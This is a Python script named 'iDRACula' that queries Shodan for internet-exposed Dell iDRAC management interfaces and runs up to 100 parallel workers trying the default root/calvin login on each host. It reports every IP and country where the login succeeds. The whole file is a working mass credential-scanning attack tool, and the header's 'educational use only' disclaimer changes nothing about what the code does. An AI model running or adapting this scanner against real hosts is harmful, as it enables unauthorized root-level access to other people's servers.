#!/usr/bin/env python

"""
$Id: $

   _____________  ___  _____       _       
  (_)  _  \ ___ \/ _ \/  __ \     | |      
   _| | | | |_/ / /_\ \ /  \/_   _| | __ _ 
  | | | | |    /|  _  | |   | | | | |/ _` |
  | | |/ /| |\ \| | | | \__/\ |_| | | (_| |
  |_|___/ \_| \_\_| |_/\____/\__,_|_|\__,_|
                                           
                                                                                    

This tool is a default credential (username/password) scanner
for Dell iDRAC devices listed in SHODAN search engine

This tool is meant for research purposes only
and any malicious usage of this tool is prohibited.

@author Jan Seidl <http://wroot.org/>

@date 2012-11-06
@version 1.0

LICENSE:
This software is distributed under the GNU General Public License version 3 (GPLv3)

LEGAL NOTICE:
THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL USE ONLY!
IF YOU ENGAGE IN ANY ILLEGAL ACTIVITY
THE AUTHOR DOES NOT TAKE ANY RESPONSIBILITY FOR IT.
BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
"""

from shodan import WebAPI
import urllib, re, httplib
import sys, getopt, socket
from multiprocessing import Process, Queue

# Python version-specific 
if  sys.version_info < (3,0):
    # Python 2.x
    import httplib
    HTTPCLIENT = httplib
else:
    # Python 3.x
    import http.client
    HTTPCLIENT = http.client

###
# Config
###

SHODAN_API_KEY="" # ADD YOUR KEY HERE
DEBUG = False
SOCKET_TIMEOUT = 5
JOIN_TIMEOUT=1.0

###
#  Constants
###

DEFAULT_CREDS   = 'user=root&password=calvin'
DEFAULT_HEADERS = {}
AUTH_RESPONSE_PATTERN = '<authResult>([0,5])</authResult>'

###
# Functions
###

socket.setdefaulttimeout(SOCKET_TIMEOUT)

def get_idrac_shodan_entries():

    try:
        
        api = WebAPI(SHODAN_API_KEY)
        # Search Shodan
        results = api.search('idrac')
    
        # Show the results
        return results

    except Exception, e:
        raise e

def check_default_credential(ip_addr):

    try:
        if DEBUG:
            print "Trying to check {0}".format(ip_addr)
        idrac = httplib.HTTPSConnection("{0}".format(ip_addr))

        if DEBUG:
            print "Issuing request to {0}".format(ip_addr)
        idrac.request("POST", "/data/login", DEFAULT_CREDS, DEFAULT_HEADERS)

        if DEBUG:
            print "Reading response from {0}".format(ip_addr)
        idrac_response = idrac.getresponse()
        idrac_contents = idrac_response.read()

        if DEBUG:
            print "Checking response match from {0}".format(ip_addr)
        authResponse = re.search(AUTH_RESPONSE_PATTERN, idrac_contents)
        
        if (authResponse):
            return True
        else:
            return False
    except Exception, e:
        return False

def idracula(queue):

    if DEBUG:
        print "Starting iDRACula Worker {0}"

    while True:

        try:
            if DEBUG:
                print "Trying to consume from queue"

            result = queue.get()

            if DEBUG:
                print "Succesfully read from queue"
                print "Checking result: {0}".format(result['ip']);

            has_default_credential = check_default_credential(result['ip']) 

            if (has_default_credential):
                print 'DEFAULT CREDENTIAL FOUND! IP: {0} TEXT: {1} COUNTRY: {2}'.format(result['ip'], result['data'], result['country_name'])
            elif (DEBUG):
                print 'NOTHING FOUND FOR IP: {0}'.format(result['ip'])

        except Exception, e:
            sys.stderr.write("Error on Worker: {0}".format(str(e)))
            break;

    if DEBUG:
        print "Ending iDRACula Worker {0}"



####
# Other Functions
####

def usage():
    print
    print '-----------------------------------------------------------------------------------------------------------'
    print ' USAGE: ./idracula.py <url> [OPTIONS]'
    print
    print ' OPTIONS:'
    print '\t Flag\t\t\tDescription\t\t\t\t\t\tDefault'
    print '\t -d, --debug\t\tEnable Debug Mode [more verbose output]\t\t\t(default: False)'
    print '\t -h, --help\t\tShows this help'
    print '-----------------------------------------------------------------------------------------------------------'

    
def error(msg):
    # print help information and exit:
    sys.stderr.write(str(msg+"\n"))
    usage()
    sys.exit(2)


####
# Main
####

def main():
    
    try:

        opts, args = getopt.getopt(sys.argv[1:], "dhw:", ["debug", "help", "workers" ])
        workers = 100

        for o, a in opts:
            if o in ("-h", "--help"):
                usage()
                sys.exit()
            elif o in ("-w", "--workers"):
                workers = int(a)
            elif o in ("-d", "--debug"):
                global DEBUG
                DEBUG = True
            else:
                error("option '"+o+"' doesn't exists")

        try:
            idracs = get_idrac_shodan_entries()


        except Exception, e:
            sys.stderr.write("Error querying SHODAN: {0}".format(str(e)))
            sys.exit(2)

        queue = Queue()
        workerPool = []

        for result in idracs['matches']:
            queue.put(result)

        if DEBUG:
            print "Queue Size is: {0}".format(queue.qsize())
        
        print "{0} SHODAN entries found for 'idrac' (but showing only {1} due SHODAN API limitations)".format(idracs['total'], queue.qsize())

        for i in range(workers):
            worker = Process(target=idracula, args=((queue), ))
            #worker.daemon = True
            worker.start()
            workerPool.append(worker)

        # Wait for all guys to finish up
        while len(workerPool) > 0:
            try:
                for worker in workerPool:
                    if worker is not None and worker.is_alive():
                        worker.join(JOIN_TIMEOUT)
                    else:
                        workerPool.remove(worker)
            except (KeyboardInterrupt, SystemExit):
                print "CTRL+C received. Killing all workers"
                for worker in workerPool:
                    try:
                        if DEBUG:
                            print "Killing worker {0}".format(worker.name)
                        worker.stop()
                        workerPool.remove(worker)
                    except Exception, ex:
                        pass # silently ignore

        print "iDRACula credential sucking action finished. Can you feel the smell of blood on the air?"

    except getopt.GetoptError, err:

        # print help information and exit:
        sys.stderr.write(str(err))
        usage()
        sys.exit(2)

if __name__ == "__main__":
    main()
